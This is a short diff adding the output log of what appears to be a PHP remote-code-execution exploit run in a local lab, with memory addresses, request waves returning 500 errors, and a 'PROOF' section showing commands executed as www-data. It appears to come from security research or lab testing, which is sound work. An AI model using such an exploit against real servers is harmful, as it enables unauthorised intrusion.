@@ -1,0 +1,10 @@
+A2=279369 B2=451384 S=0x7f8f834f8398 zif=0x7f8f8542f370 workers=8
+=== attempt 1: 2 waves x 8 A2 ===
+  wave 1: 8/8 500, sample='HTTP/1.0 500 Internal Server Error'
+  wave 2: 8/8 500, sample='HTTP/1.0 500 Internal Server Error'
+  B2 attempt 1
+  B2 failed: EOFError('closed before response headers')
+PROOF /home/ravhi/randoman/deepjb/php2shell-lab/official-lab/multi-out/ka:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Linux 4f898675c501 5.15.153.1-microsoft-standard-WSL2 #1 SMP Fri Mar 29 23:14:13 UTC 2024 x86_64 GNU/Linux
+
